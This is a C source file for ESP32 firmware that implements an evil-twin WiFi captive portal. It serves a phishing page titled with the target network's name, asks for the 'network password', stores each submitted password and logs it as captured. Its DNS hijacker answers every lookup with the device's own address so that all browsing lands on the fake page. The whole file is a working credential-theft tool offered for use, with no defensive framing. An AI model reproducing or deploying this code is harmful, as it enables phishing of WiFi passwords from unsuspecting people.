#include "captive_portal.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

static const char *TAG = "captive";

#define DNS_PORT      53
#define MAX_DNS_PKT   512

// ---------- HTML pages ----------

static const char LOGIN_HTML[] =
"<!DOCTYPE html><html><head><meta charset='utf-8'>"
"<title>Sign in</title>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<style>"
"body{font-family:-apple-system,sans-serif;background:#f0f0f5;margin:0;padding:20px;}"
".box{max-width:380px;margin:40px auto;background:#fff;padding:24px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.06);}"
"h2{margin:0 0 6px;color:#1a1a1a;font-size:20px;}"
"p{color:#666;font-size:14px;margin:0 0 18px;}"
"input{width:100%%;padding:12px;margin:8px 0;border:1px solid #d0d0d5;border-radius:8px;font-size:16px;box-sizing:border-box;}"
"button{background:#007aff;color:#fff;border:0;padding:13px;width:100%%;font-size:16px;border-radius:8px;font-weight:600;margin-top:8px;}"
".n{color:#888;font-size:12px;margin-top:14px;text-align:center;}"
"</style></head><body>"
"<div class='box'>"
"<h2>Sign in to \"%s\"</h2>"
"<p>Enter the network password to continue</p>"
"<form action='/login' method='POST'>"
"<input type='password' name='pw' placeholder='WiFi password' autofocus required>"
"<button type='submit'>Join</button>"
"</form>"
"<p class='n'>The network requires authentication</p>"
"</div></body></html>";

static const char CONNECTING_HTML[] =
"<!DOCTYPE html><html><head><meta charset='utf-8'>"
"<meta http-equiv='refresh' content='8'>"
"<title>Connecting</title>"
"<style>"
"body{font-family:-apple-system,sans-serif;background:#f0f0f5;margin:0;padding:20px;text-align:center;}"
".box{max-width:380px;margin:80px auto;background:#fff;padding:32px;border-radius:12px;}"
"h2{color:#1a1a1a;}"
".s{display:inline-block;width:32px;height:32px;border:4px solid #d0d0d5;border-top-color:#007aff;border-radius:50%%;animation:r 1s linear infinite;margin:16px;}"
"@keyframes r{to{transform:rotate(360deg);}}"
"</style></head><body>"
"<div class='box'>"
"<div class='s'></div>"
"<h2>Connecting...</h2>"
"<p>Establishing secure connection</p>"
"</div></body></html>";

// ---------- state ----------

static cp_capture_t      captures[CP_MAX_CAPTURES];
static uint8_t           capture_count = 0;
static SemaphoreHandle_t cap_mutex     = NULL;

static char              target_ssid[33];
static httpd_handle_t    httpd         = NULL;
static TaskHandle_t      dns_task_h    = NULL;
static volatile bool     cp_running    = false;

// ---------- URL decode helper ----------

static void url_decode(const char *src, size_t src_len, char *dst, size_t dst_size) {
    size_t out = 0;
    for (size_t i = 0; i < src_len && out + 1 < dst_size; i++) {
        if (src[i] == '+') {
            dst[out++] = ' ';
        } else if (src[i] == '%' && i + 2 < src_len) {
            char hex[3] = { src[i + 1], src[i + 2], 0 };
            dst[out++] = (char)strtol(hex, NULL, 16);
            i += 2;
        } else {
            dst[out++] = src[i];
        }
    }
    dst[out] = '\0';
}

// ---------- HTTP handlers ----------

static esp_err_t login_get_handler(httpd_req_t *req) {
    char buf[2048];
    int n = snprintf(buf, sizeof(buf), LOGIN_HTML, target_ssid);
    if (n < 0) n = 0;
    if (n >= (int)sizeof(buf)) n = sizeof(buf) - 1;
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, buf, n);
    return ESP_OK;
}

static esp_err_t login_post_handler(httpd_req_t *req) {
    char body[256];
    int recv_total = 0;
    int remaining  = req->content_len;
    if (remaining > (int)sizeof(body) - 1) remaining = sizeof(body) - 1;

    while (recv_total < remaining) {
        int r = httpd_req_recv(req, body + recv_total, remaining - recv_total);
        if (r <= 0) break;
        recv_total += r;
    }
    body[recv_total] = '\0';

    // Parse form: pw=<value>(&...)
    char pw[CP_PASSWORD_MAX] = { 0 };
    const char *p = strstr(body, "pw=");
    if (p) {
        p += 3;
        const char *end = strchr(p, '&');
        size_t pw_len = end ? (size_t)(end - p) : strlen(p);
        url_decode(p, pw_len, pw, sizeof(pw));
    }

    if (pw[0]) {
        xSemaphoreTake(cap_mutex, portMAX_DELAY);
        if (capture_count < CP_MAX_CAPTURES) {
            strncpy(captures[capture_count].password, pw, CP_PASSWORD_MAX - 1);
            captures[capture_count].password[CP_PASSWORD_MAX - 1] = '\0';
            captures[capture_count].captured_at_us = esp_timer_get_time();
            capture_count++;
        }
        xSemaphoreGive(cap_mutex);
        ESP_LOGW(TAG, "*** CAPTURED PASSWORD: \"%s\" ***", pw);
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, CONNECTING_HTML, sizeof(CONNECTING_HTML) - 1);
    return ESP_OK;
}

// ---------- DNS hijacker (UDP/53, answer everything with 192.168.4.1) ----------

static void dns_task(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        ESP_LOGE(TAG, "DNS socket create failed");
        vTaskDelete(NULL);
        return;
    }

    struct sockaddr_in addr = { 0 };
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port        = htons(DNS_PORT);

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        ESP_LOGE(TAG, "DNS bind failed");
        close(sock);
        vTaskDelete(NULL);
        return;
    }

    // 1-second recv timeout so we can check cp_running and exit cleanly
    struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    ESP_LOGI(TAG, "DNS hijacker listening on UDP/53");

    uint8_t pkt[MAX_DNS_PKT];
    while (cp_running) {
        struct sockaddr_in src;
        socklen_t srclen = sizeof(src);
        int len = recvfrom(sock, pkt, sizeof(pkt), 0,
                            (struct sockaddr *)&src, &srclen);
        if (len < 12) continue;             // bad packet (DNS header is 12 bytes)
        if (len + 16 > (int)sizeof(pkt)) continue;

        // Set response flags 0x8180 (response, recursion available, no error)
        pkt[2] = 0x81; pkt[3] = 0x80;
        // ancount = 1, arcount = 0
        pkt[6] = 0x00; pkt[7] = 0x01;
        pkt[10] = 0x00; pkt[11] = 0x00;

        // Append answer: ptr to qname (0xc00c) + A + IN + TTL 60s + RDLENGTH 4 + IP
        uint8_t *ans = pkt + len;
        ans[0]  = 0xc0; ans[1]  = 0x0c;
        ans[2]  = 0x00; ans[3]  = 0x01;
        ans[4]  = 0x00; ans[5]  = 0x01;
        ans[6]  = 0x00; ans[7]  = 0x00; ans[8] = 0x00; ans[9] = 0x3c;
        ans[10] = 0x00; ans[11] = 0x04;
        ans[12] = 192;  ans[13] = 168; ans[14] = 4;    ans[15] = 1;

        sendto(sock, pkt, len + 16, 0, (struct sockaddr *)&src, srclen);
    }

    close(sock);
    ESP_LOGI(TAG, "DNS hijacker stopped");
    vTaskDelete(NULL);
}

// ---------- API ----------

void captive_portal_start(const char *ssid) {
    if (!cap_mutex) cap_mutex = xSemaphoreCreateMutex();

    strncpy(target_ssid, (ssid && ssid[0]) ? ssid : "Free WiFi", 32);
    target_ssid[32] = '\0';

    xSemaphoreTake(cap_mutex, portMAX_DELAY);
    capture_count = 0;
    memset(captures, 0, sizeof(captures));
    xSemaphoreGive(cap_mutex);

    // HTTP server with wildcard URI so any OS captive-portal probe hits the login page
    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.uri_match_fn     = httpd_uri_match_wildcard;
    cfg.max_uri_handlers = 4;
    cfg.lru_purge_enable = true;

    if (httpd_start(&httpd, &cfg) != ESP_OK) {
        ESP_LOGE(TAG, "httpd_start failed");
        return;
    }

    httpd_uri_t login_post = {
        .uri     = "/login",
        .method  = HTTP_POST,
        .handler = login_post_handler,
    };
    httpd_register_uri_handler(httpd, &login_post);

    httpd_uri_t catchall = {
        .uri     = "/*",
        .method  = HTTP_GET,
        .handler = login_get_handler,
    };
    httpd_register_uri_handler(httpd, &catchall);

    cp_running = true;
    xTaskCreate(dns_task, "dns_hijack", 4096, NULL, 5, &dns_task_h);

    ESP_LOGI(TAG, "Captive portal up for SSID \"%s\"", target_ssid);
}

void captive_portal_stop(void) {
    cp_running = false;

    if (httpd) {
        httpd_stop(httpd);
        httpd = NULL;
    }

    // DNS task wakes from recvfrom on the 1-second timeout, sees cp_running=false, exits
    vTaskDelay(pdMS_TO_TICKS(1100));
    dns_task_h = NULL;
}

uint8_t captive_portal_get_count(void) {
    return capture_count;
}

const cp_capture_t *captive_portal_get_latest(void) {
    if (capture_count == 0) return NULL;
    return &captures[capture_count - 1];
}
